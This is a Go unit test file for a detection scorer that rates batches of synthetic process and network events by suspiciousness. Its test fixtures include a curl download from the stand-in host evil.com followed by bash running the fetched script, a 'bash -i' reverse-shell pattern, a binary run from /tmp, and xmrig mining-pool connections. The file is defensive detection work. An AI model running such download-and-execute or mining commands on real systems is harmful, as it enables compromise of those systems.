package interestingness

import (
	"testing"
)

type testEvent struct {
	eventType   string
	commandLine string
	imagePath   string
	remoteAddr  string
	remotePort  uint16
	filePath    string
	processID   uint32
	parentGUID  string
}

func (e testEvent) GetEventType() string   { return e.eventType }
func (e testEvent) GetCommandLine() string { return e.commandLine }
func (e testEvent) GetImagePath() string   { return e.imagePath }
func (e testEvent) GetRemoteAddr() string  { return e.remoteAddr }
func (e testEvent) GetRemotePort() uint16  { return e.remotePort }
func (e testEvent) GetFilePath() string    { return e.filePath }
func (e testEvent) GetProcessID() uint32   { return e.processID }
func (e testEvent) GetParentGUID() string  { return e.parentGUID }

func TestScorer_LsCommand(t *testing.T) {
	s := New()
	batch := BatchInfo{
		Events: []EventLike{
			testEvent{eventType: "execve", commandLine: "ls -la", imagePath: "/bin/ls"},
		},
	}
	score := s.Score(batch, DefaultKnownBinaries())
	if score != 0.0 {
		t.Errorf("expected 0.0 for ls, got %.2f", score)
	}
}

func TestScorer_CurlPipeBash(t *testing.T) {
	s := New()
	batch := BatchInfo{
		Events: []EventLike{
			testEvent{eventType: "execve", commandLine: "curl http://evil.com/script.sh", imagePath: "/usr/bin/curl"},
			testEvent{eventType: "execve", commandLine: "bash /tmp/script.sh", imagePath: "/bin/bash", filePath: "/tmp/script.sh"},
			testEvent{eventType: "connect", commandLine: "", imagePath: "", remoteAddr: "1.2.3.4", remotePort: 3333},
		},
	}
	score := s.Score(batch, DefaultKnownBinaries())
	// Should be high: curl download + exec from /tmp + network connection
	if score < 0.5 {
		t.Errorf("expected score >= 0.5 for curl pipe bash chain, got %.2f", score)
	}
}

func TestScorer_NearMiss(t *testing.T) {
	s := New()
	batch := BatchInfo{
		Events: []EventLike{
			testEvent{eventType: "execve", commandLine: "bash -c 'whoami'", imagePath: "/bin/bash"},
		},
		NearMisses: []NearMiss{
			{Pattern: "bash -i", Event: testEvent{eventType: "execve", commandLine: "bash -c 'whoami'", imagePath: "/bin/bash"}},
		},
	}
	score := s.Score(batch, DefaultKnownBinaries())
	if score < 0.1 {
		t.Errorf("expected score >= 0.1 for near miss, got %.2f", score)
	}
}

func TestScorer_BenignBatch(t *testing.T) {
	s := New()
	batch := BatchInfo{
		Events: []EventLike{
			testEvent{eventType: "execve", commandLine: "ls -la /home", imagePath: "/bin/ls"},
			testEvent{eventType: "execve", commandLine: "cat /etc/passwd", imagePath: "/bin/cat"},
			testEvent{eventType: "execve", commandLine: "git status", imagePath: "/usr/bin/git"},
		},
	}
	score := s.Score(batch, DefaultKnownBinaries())
	if score != 0.0 {
		t.Errorf("expected 0.0 for all-benign batch, got %.2f", score)
	}
}

func TestScorer_TempDirExecution(t *testing.T) {
	s := New()
	batch := BatchInfo{
		Events: []EventLike{
			testEvent{eventType: "execve", commandLine: "/tmp/malware", imagePath: "/tmp/malware"},
		},
	}
	score := s.Score(batch, DefaultKnownBinaries())
	if score < 0.2 {
		t.Errorf("expected score >= 0.2 for temp dir execution, got %.2f", score)
	}
}

func TestScorer_MultipleMiningPorts(t *testing.T) {
	s := New()
	batch := BatchInfo{
		Events: []EventLike{
			testEvent{eventType: "connect", remoteAddr: "pool.com", remotePort: 3333, imagePath: "/usr/bin/xmrig"},
			testEvent{eventType: "connect", remoteAddr: "pool2.com", remotePort: 4444, imagePath: "/usr/bin/xmrig"},
			testEvent{eventType: "connect", remoteAddr: "pool3.com", remotePort: 5555, imagePath: "/usr/bin/xmrig"},
		},
	}
	score := s.Score(batch, DefaultKnownBinaries())
	if score < 0.4 {
		t.Errorf("expected score >= 0.4 for rapid connections + unknown binary, got %.2f", score)
	}
}
